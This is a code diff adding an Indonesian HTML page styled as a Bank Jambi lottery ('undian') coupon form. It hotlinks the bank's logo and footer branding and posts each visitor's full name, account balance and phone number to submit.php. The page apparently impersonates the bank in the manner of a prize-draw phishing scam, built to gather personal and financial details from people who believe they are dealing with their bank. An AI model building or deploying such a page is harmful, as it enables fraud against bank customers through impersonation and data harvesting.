@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Bank Jambi - Undian</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="flex items-center justify-center h-screen" style="background-color: #800000;">
+  <div class="bg-white p-6 rounded-lg shadow-md w-96">
+    <div class="text-center mb-4">
+      <img src="https://bankjambi.co.id/assets/img/logohead.png" alt="BANK JAMBI Logo" class="mx-auto h-12"/>
+    </div>
+    <h2 class="text-xl font-bold mb-4 text-center">Formulir Undian BANK JAMBI</h2>
+    <form action="submit.php" method="POST">
+      <div class="mb-4">
+        <label for="nama" class="block text-sm font-medium">Nama Lengkap</label>
+        <input type="text" id="nama" name="nama" required class="mt-1 p-2 w-full border rounded-md"/>
+      </div>
+      <div class="mb-4">
+        <label for="saldo" class="block text-sm font-medium">Saldo Akhir</label>
+        <input type="text" id="saldo" name="saldo" required placeholder="Rp. 0" class="mt-1 p-2 w-full border rounded-md"/>
+        <small id="terbilang" class="text-xs text-gray-500 block mt-1">0 rupiah</small>
+      </div>
+      <div class="mb-4">
+        <label for="hp" class="block text-sm font-medium">Nomor HP</label>
+        <input type="tel" id="hp" name="hp" required pattern="08[0-9]{8,11}" placeholder="0812XXXXXXXX" class="mt-1 p-2 w-full border rounded-md"/>
+      </div>
+      <button type="submit" class="w-full text-white py-2 rounded-md hover:opacity-90" style="background-color: #800000;">
+        Cetak Kupon
+      </button>
+    </form>
+    <p class="text-xs text-center text-gray-500 mt-4">© 2025 BANK JAMBI</p>
+  </div>
+
+  <script>
+    const inputSaldo = document.getElementById("saldo");
+    const labelTerbilang = document.getElementById("terbilang");
+
+    inputSaldo.addEventListener("input", function () {
+      let angka = this.value.replace(/[^\d]/g, '');
+      if (angka) {
+        angka = parseInt(angka, 10);
+        this.value = "Rp. " + angka.toLocaleString("id-ID");
+        labelTerbilang.textContent = formatRupiah(angka);
+      } else {
+        this.value = "";
+        labelTerbilang.textContent = "0 rupiah";
+      }
+    });
+
+    function formatRupiah(angka) {
+      if (angka === 0) return "0 rupiah";
+      else if (angka < 1000) return angka + " rupiah";
+      else if (angka < 10000) return "Ribu rupiah";
+      else if (angka < 100000) return "Puluh ribu rupiah";
+      else if (angka < 1000000) return "Ratus ribu rupiah";
+      else if (angka < 10000000) return "Juta rupiah";
+      else if (angka < 100000000) return "Puluh juta rupiah";
+      else if (angka < 1000000000) return "Ratus juta rupiah";
+      else if (angka < 10000000000) return "Miliar rupiah";
+      else if (angka < 100000000000) return "Puluh Miliar rupiah";
+      else if (angka < 1000000000000) return "Ratus Miliar rupiah";
+      else if (angka < 10000000000000) return "Triliun rupiah";
+      else if (angka < 100000000000000) return "Puluh Triliun rupiah";
+      else if (angka < 1000000000000000) return "Ratus Triliun rupiah";
+      else if (angka < 10000000000000000) return "Quadrillion rupiah";
+      else if (angka < 100000000000000000) return "Puluh Quadrillion rupiah";
+      else if (angka < 1000000000000000000) return "Ratus Quadrillion rupiah";
+      else {
+        inputSaldo.disabled = true;
+        return "Nominal Terlalu Besar!";
+      }
+    }
+  </script>
+</body>
+</html>
